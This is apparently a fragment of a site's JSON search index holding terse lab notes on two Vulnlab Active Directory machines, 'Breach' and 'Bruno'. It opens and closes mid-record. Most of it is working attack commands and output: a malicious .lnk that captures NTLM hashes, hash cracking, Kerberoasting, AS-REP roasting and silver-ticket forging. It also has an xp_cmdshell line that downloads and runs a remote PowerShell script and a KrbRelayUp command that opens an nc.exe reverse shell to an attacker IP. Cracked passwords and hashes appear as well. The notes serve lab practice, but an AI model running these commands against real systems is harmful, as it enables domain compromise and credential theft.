$lnk.Save()\r[Convert]::ToBase64String([IO.File]::ReadAllBytes(\u0026#34;C:\\Malicious.ink\u0026#34;))\rTAAAAAEUAgAAAAAAwAAAAAAAAEbEAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAQAAAE8GAAAAAAAAAAAAAE4AQgByAG8AdwBzAGkAbgBnACAAdABvACAAdABoAGUAIABkAGkAcgAgAHQAaABpAHMAIABmAGkAbABlACAAbABpAHYAZQBzACAAaQBuACAAdwBpAGwAbAAgAHAAZQByAGYAbwByAG0AIABhAG4AIABhAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIAByAGUAcQB1AGUAcwB0AC4AHQAlAHcAaQBuAGQAaQByACUAXABzAHkAcwB0AGUAbQAzADIAXABzAGgAZQBsAGwAMwAyAC4AZABsAGwA7gAAAAwAAKAUAB9YDRos8CG+UEOIsHNn/JbvPLMAAACtALuvkzufAAQAAAAAAC0AAAAxU1BTc0PlCr5DrU+F5GnchjOYbhEAAAALAAAAAAsAAAD//wAAAAAAAEEAAAAxU1BTMPElt+9HGhCl8QJgjJ7rrCUAAAAKAAAAAB8AAAAKAAAAMQAwAC4AOAAuADMALgAxADIAAAAAAAAALQAAADFTUFM6pL3eszeDQ5HnRJjaKZWrEQAAAAMAAAAAEwAAAAAAAAAAAAAAAAAAAAAAHQDDAABcXDEwLjguMy4xMlxAdGhyZWF0LnBuZwAAABQDAAABAACgXFwxMC44LjMuMTJcQHRocmVhdC5wbmcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABcAFwAMQAwAC4AOAAuADMALgAxADIAXABAAHQAaAByAGUAYQB0AC4AcABuAGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\rTransfert to our machine and upload it into the share share\\transfert [SMB] NTLMv2-SSP Client : 10.10.107.17 [SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong [SMB] NTLMv2-SSP Hash : Julia.Wong::BREACH:1122334455667788:B4BCED802A722B8FC26FBD8FBF017EBC:0101000000000000804CB1E3D7E4DA014C704BA79381D1A70000000002000800460038005100310001001E00570049004E002D0057004E00420046004900430053004F0051004500530004003400570049004E002D0057004E00420046004900430053004F005100450053002E0046003800510031002E004C004F00430041004C000300140046003800510031002E004C004F00430041004C000500140046003800510031002E004C004F00430041004C0007000800804CB1E3D7E4DA010600040002000000080030003000000000000000010000000020000000C2A2EFBF44EF69D72B2D1FB4001F1F6E993EDCB2246C145A68A21868A59C280A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000\rCrack : john --wordlist=/usr/share/wordlists/rockyou.txt hash Julia.Wong : Computer1\rUsers :\nsvc_mssql Christine.Bruce Hugh.Watts Jasmine.Slater Lawrence.Kaur George.Williams Jasmine.Price Hilary.Reed claire.pope diana.pope julia.wong\rbloodhound-python -d \u0026#39;breach.vl\u0026#39; -u \u0026#39;Julia.Wong\u0026#39; -p \u0026#39;Computer1\u0026#39; -ns $t -dc BREACHDC.breach.vl -c all\rUser VL{5ad5861a4669ba18796ea4513a6a892b}\nFound an NTLM hashe :\nDFBE70A7E5CC19A398EBF1B96859CE5D\rKerberoastable user : GetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip $t\rImpacket v0.11.0 - Copyright 2023 Fortra ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------------------- --------- -------- -------------------------- -------------------------- ---------- MSSQLSvc/breachdc.breach.vl:1433 svc_mssql 2022-02-17 11:43:08.106169 2024-08-02 16:20:40.486466 [-] CCache file is not found. Skipping... $krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$7b234ef22551c3249657af73cb4e56f5$8ed89cd70013f4af73b57effd6b2933119afe2ec359158f0c38b246a1dd20207d44a71312df630d8d136debd616685d9947b7c53b4189521d82f27ef8552e2973bcc8ee934543afb245e391825b44dcf7bb66f09770ab04632c5757b294b68a427882713cba63e5e140b9b90d3a8da24c81c1b5b534a062efdce84f96c066a3fe7eb4afe25f229c951cd60486efc68e82278c1aa34eeac6427d112c882203778c75031a623897e17997740e8caef00325eab8758ec0eb7fb5fff095f5b8447fefd5555c0ceb25aec341999643ccaf754caba9c70bcb7d6efbfa7b6b3f0e1e3ce686807ecfb857da788043d620f74bee2659047fd0ff3792285b50589e7c8eda8f063bb5328c3925f98e8f3e6ad7f6aea5eb76051814e8c96a53ac35bf4e044a63feb51d47f6da91bf7162d029d68eaecce2a3161c4969adb2509de1aaf99ec2de0f1eefa77daced469bc72aecf3d1bfb7226c2d1b3574a85a3f64423df2f9bfb2cd45d06b9677f78cbf9410e4b9687e511106d6259f7498649139000967975a2e7ff0a0f828d7204bf2745884879ae9b5d405eef7d038c1d13264205bad37dc5143ee69e34b8ba317345c51e8aef320cb6e0d9e78701fbc1427604e82d6d008d40ae53a56a0576914b0c499d74a949b143d82d56a774e712c7cb2ba8f5a5adb731a147d5ef41d6e040c703c0fc19fe2647f3ec5c68228865870b8b54804bde059d3c710963ed152978e1801687ad0bc6131deb427f05213c8c1c789fac7357011e08eb42443c771c24c7f6e28ade39d9c61d8388a270636953b3252738e9518cd4f1c70f861b5a2d8552eb6a721d4bc29a24194454b8e9b4253cccc733ca30eae84a9a62355c8522765121b255a99d8fbd9e29def4999b8ac67def0a7c8bb5a38949366076e2a75ba4fd03a47dbe6800ab26ec8d0bcb52504fb59197f3554eb3be577ddb7b1de9597ca890ded8d1779f7f5b11007912e7933b4809fc41cf72d7819f7beebe5c6bbb6676c048acb861bc91d189cfb1441947fc34b61f68171e858d6a063c739b2c0212270c6d64f96603c473afd87b33d65552782d0bf8205be4df82c3cae61a9bc459d1fdba248bbc5ed31b2a984422ae914525c4e2f09f7f15a9ecbf4f48381cfe565c72548d151c65211f41f0acfd6e9a41458cf906a1fff86eb38d1c937c2804e339a39ed58591a9061e633cd5aeba364c7f76ef28714dec0aade1df4da51d110b6238969753f2d69d6210f300796a039fb5d79bbe14e4ee6a3a66f39725d5c566f6016724f8c7f8517a1c9642c35b021a22908fd734e5c9c9223e1aecd681c4f735cae2c9c99f18cf18822bc167b65f635bf23fc9a9b9b3519d12faa8156b781b356530f82683971a292b81640901a25bf06d48d8bd901e69c548db755fcb464d5b92817c50a4f2780eef73f936e25ae29d910be9637e6463b0709832444865888fe3b584e9b8e94a6c3600 john --format=krb5tgs --wordlist= /usr/share/wordlists/rockyou.txt hash svc_mssql : Trustno1\rSilver Ticket : rpcclient $\u0026gt; lsaquery Domain Name: BREACH Domain Sid: S-1-5-21-2330692793-3312915120-706255856 ticketer.py -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -dc-ip $t -spn MSSQLSvc/breachdc.breach.vl:1433 -user administrator target export KRB5CCNAME=MSSQLSvc.breachdc.breach.vl:1433.ccache rdate -n $t mssqlclient.py -k breachdc.breach.vl -no-pass -debug #Eneable XP_cmdshell xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\u0026#34;http://10.8.3.12:8080/shell.ps1\u0026#34;)\rGod Potatoe :\ngodo.exe -cmd \u0026#34;cmd /c type c:\\users\\administrator\\desktop\\root.txt\u0026#34; https://github.com/BeichenDream/GodPotato/releases\rRoot : VL{069f8fe92a80b20151e0a5ffa1dc040c}\n","date":"2023-09-07","id":23,"permalink":"/notes/lab/vulnlab/breach/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http          Microsoft IIS httpd 10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-methods:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  Potentially risky methods: TRACE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: IIS Windows Server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-IIS/10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-08-02 08:48:10Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: breach.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1433/tcp open  ms-sql-s      Microsoft SQL Server \u003cspan class=\"m\"\u003e2019\u003c/span\u003e 15.00.2000.00\u003cspan class=\"p\"\u003e;\u003c/span\u003e RTM\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ms-sql-info: ERROR: Script execution failed \u003cspan class=\"o\"\u003e(\u003c/span\u003euse -d to debug\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ms-sql-ntlm-info: ERROR: Script execution failed \u003cspan class=\"o\"\u003e(\u003c/span\u003euse -d to debug\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eSSL_Self_Signed_Fallback\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-02T08:24:04\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2054-08-02T08:24:04\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-02T08:48:52+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: breach.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-02T08:48:52+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: BREACH\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: BREACH\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: BREACHDC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: breach.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: BREACHDC.breach.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Tree_Name: breach.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-08-02T08:48:12+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eBREACHDC.breach.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-01T08:23:01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-01-31T08:23:01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: BREACHDC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-08-02T08:48:14\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eWritable Share\u003c/p\u003e","tags":[],"title":"Breach"},{"content":"Scan :\nPORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 06-29-22 04:55PM \u0026lt;DIR\u0026gt; app | 06-29-22 04:33PM \u0026lt;DIR\u0026gt; benign | 06-29-22 01:41PM \u0026lt;DIR\u0026gt; malicious |_06-29-22 04:33PM \u0026lt;DIR\u0026gt; queue 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-14 13:58:09Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=brunodc.bruno.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:brunodc.bruno.vl | Not valid before: 2023-08-22T06:05:15 |_Not valid after: 2024-08-21T06:05:15 |_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_ssl-date: TLS randomness does not represent time |_http-title: IIS Windows Server | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=bruno-BRUNODC-CA | Not valid before: 2022-06-29T13:23:01 |_Not valid after: 2121-06-29T13:33:00 | http-methods: |_ Potentially risky methods: TRACE 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap | ssl-cert: Subject: commonName=brunodc.bruno.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:brunodc.bruno.vl | Not valid before: 2023-08-22T06:05:15 |_Not valid after: 2024-08-21T06:05:15 |_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name) |_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=brunodc.bruno.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:brunodc.bruno.vl | Not valid before: 2023-08-22T06:05:15 |_Not valid after: 2024-08-21T06:05:15 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=brunodc.bruno.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:brunodc.bruno.vl | Not valid before: 2023-08-22T06:05:15 |_Not valid after: 2024-08-21T06:05:15 |_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time. 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=brunodc.bruno.vl | Not valid before: 2024-08-13T13:54:38 |_Not valid after: 2025-02-12T13:54:38 | rdp-ntlm-info: | Target_Name: BRUNO | NetBIOS_Domain_Name: BRUNO | NetBIOS_Computer_Name: BRUNODC | DNS_Domain_Name: bruno.vl | DNS_Computer_Name: brunodc.bruno.vl | DNS_Tree_Name: bruno.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-08-14T13:58:49+00:00 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-08-14T13:58:52 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled and required\rWe read the the changelog in the FTP and discover the user svc_scan\nTry to get a hash from that user :\nGetNPUsers.py bruno.vl/ -usersfile usernames.txt -format john -outputfile hashes.asreproast\r$krb5asrep$svc_scan@BRUNO.VL:03f3f1d743b9cf6d30349c8685c4ec37$7eaf7c3f544d5cead697bdd919900a5cc10c5558d3ce22afbffdc7ec7030b8bd0aa4b84986f48b4774b1686e2464832f8636298d638d5483d91d22a8ef2d65899135825b44506d0296267b9f1561565842305b32078403ad08dd5cd7762ed41a58d92856e9306012f44c517e1e00b985190500f930372dc1547c278655cf7f566c8a84f0ca3995fb01b33b705e270936a76903fe530fc6abac1f06c5bad66ac289a877ccb0d5340a61c5fde2ecc9ae5812e2621c36441c1a2c785dd87b2bf4f0d7643c0d3002807a099f58682e132cb3a525d6b63a1203aadaa708c851685625b8106353 Sunshine1 ($krb5asrep$svc_scan@BRUNO.VL)\rReverse the binary and we observe that we can do an Path traversal to dll hijacking with Zzip user VL{6efd85f20df80e14a0452381657809e4}\nKrbrelayup :\nCheck if exploitable LDAP signing :\n$ldapSigningSetting = Get-ItemProperty -Path \u0026#39;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\u0026#39; -Name \u0026#39;LDAPServerIntegrity\u0026#39; $ldapSigningSetting.LDAPServerIntegrity nxc ldap \u0026lt;ip\u0026gt; -u user -p pass -M ldap-checker netexec ldap brunodc.bruno.vl -u \u0026#34;svc_scan\u0026#34; -p \u0026#34;Sunshine1\u0026#34; -M maq #MachineAccountQuota: 10\rExploit with a tool : .\\KrbRelayUp.exe relay brunodc.bruno.vl -CreateNewComputerAccount -ComputerName pwned$ -ComputerPassword P@ssword1234 -cls \u0026lt;CLS\u0026gt;\r./KrbRelayUp spawn -m rbcd --DomainController brunodc.bruno.vl -cn pwned$ -cp P@ssword1234 --sc \u0026#34;C:\\Users\\svc_scan\\Documents\\nc.exe 10.8.3.12 4242 -e cmd\u0026#34;\rRoot: VL{b528ba689d85ca396374c0f186087a7d}\nRessources : https://github.com/Dec0ne/KrbRelayUp?tab=readme-ov-file https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9 https://github.com/ohpe/juicy-potato/tree/master/CLSID\n","date":"2023-09-07","id":24,"permalink":"/notes/lab/vulnlab/bruno/","summary":"\u003cp\u003eScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e21/tcp   open  ftp           Microsoft ftpd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ftp-syst:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  SYST: Windows_NT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ftp-anon: Anonymous FTP login allowed \u003cspan class=\"o\"\u003e(\u003c/span\u003eFTP code 230\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e 06-29-22  04:55PM       \u0026lt;DIR\u0026gt;          app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e 06-29-22  04:33PM       \u0026lt;DIR\u0026gt;          benign\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e 06-29-22  01:41PM       \u0026lt;DIR\u0026gt;          malicious\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_06-29-22  04:33PM       \u0026lt;DIR\u0026gt;          queue\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http          Microsoft IIS httpd 10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-IIS/10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: IIS Windows Server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-methods:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  Potentially risky methods: TRACE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 